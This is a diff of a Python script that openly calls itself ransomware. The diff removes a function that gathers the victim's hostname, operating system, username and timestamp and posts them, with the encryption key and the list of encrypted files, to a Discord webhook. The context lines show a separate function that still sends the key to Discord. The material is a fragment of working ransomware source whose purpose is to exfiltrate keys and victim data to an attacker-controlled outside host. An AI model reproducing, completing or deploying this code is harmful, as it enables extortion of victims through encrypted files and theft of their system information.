@@ -70,46 +70,6 @@ def generateKey():
     # Send the key via desktop webhook
     send_key_to_discord(key)
     
-#Function to send information to Discord webhook
-def send_info_to_discord(key, encrypted_files):
-    discord_webhook_url = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'
-
-    #Collect system information
-    system_info = {
-        "hostname": socket.gethostname(),
-        "os": platform.system(),
-        "os_version": platform.version(),
-        "user": os.getlogin(),
-        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    }
-
-    # Construct the payload for Discord
-    data = {
-        "content": "Ransomware Encryption Report",
-        "embeds": [{
-            "title": "Encryption Details",
-            "fields": [
-                {"name": "Symmetric Key", "value": key.decode(), "inline": False},
-                {"name": "Encrypted Files", "value": "\n".join(encrypted_files), "inline": False},
-                {"name": "Victim Hostname", "value": system_info["hostname"], "inline": True},
-                {"name": "Operating System", "value": system_info["os"], "inline": True},
-                {"name": "OS Version", "value": system_info["os_version"], "inline": True},
-                {"name": "User", "value": system_info["user"], "inline": True},
-                {"name": "Timestamp", "value": system_info["timestamp"], "inline": True}
-            ]
-        }]
-    }
-
-    # Send the data to the Discord webhook
-    try:
-        response = requests.post(discord_webhook_url, json=data)
-        if response.status_code == 204:
-            print("Information sent to Discord successfully.")
-        else:
-            print(f"Failed to send information to Discord. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"Error sending information to Discord: {e}")
-
     
 def send_key_to_discord(key):
     # Replace with your Discord webhook URL
